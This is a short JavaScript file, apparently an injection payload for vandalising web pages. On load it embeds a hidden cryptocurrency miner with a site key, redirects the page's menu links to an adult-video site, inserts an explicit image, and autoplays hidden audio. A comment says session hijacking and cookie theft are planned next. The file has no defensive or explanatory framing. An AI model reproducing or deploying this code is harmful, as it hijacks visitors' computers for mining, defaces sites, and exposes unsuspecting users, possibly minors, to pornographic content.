
// We inject a link in to the page
function injectpic(url){
    var pic = document.createElement('img');
    pic.src = url;
    pic.width = 1024;
    pic.height = 755;
    document.body.appendChild(pic);
}

// Crypto Hijacking
function cryptominer(){
    var c = document.createElement('script');
    c.src = "https://minero.cc/lib/minero-hidden.min.js";
    c.setAttribute('async','');
    var g = document.createElement('div');
    g.class = "minero-hidden";
    g.style = "display: none";
    g.setAttribute('data-key','e28c06e21135ac068da87519d76f51ec');
    document.body.appendChild(g);
    document.body.appendChild(c);    
}

// Edits the menu links to a new url
function redriect(url){
    var a = document.getElementsByClassName('menu');
    var b = 0;
    while(b < 6){
        a[b].href = url;
        b++;
    }
}

// plays an audio file and injects it in the page
function playSound(url){
    var audio = document.createElement('audio');
    audio.style.display = "none";
    audio.src = url;
    audio.autoplay = true;
    document.body.appendChild(audio);
}

function start(){
    playSound("https://raw.githubusercontent.com/NE1W01F/the-furry-porn-bomb/master/Amazon.mp3");
    injectpic("https://cdnio.luscious.net/987/lusciousnet_000000top1_855317720.jpg");
    redriect("https://www.thumbzilla.com/video/embed?key=ph59b436f94f7d0");
    cryptominer();
}

// soon i am going to work on session hijacking and getting cookies

start();
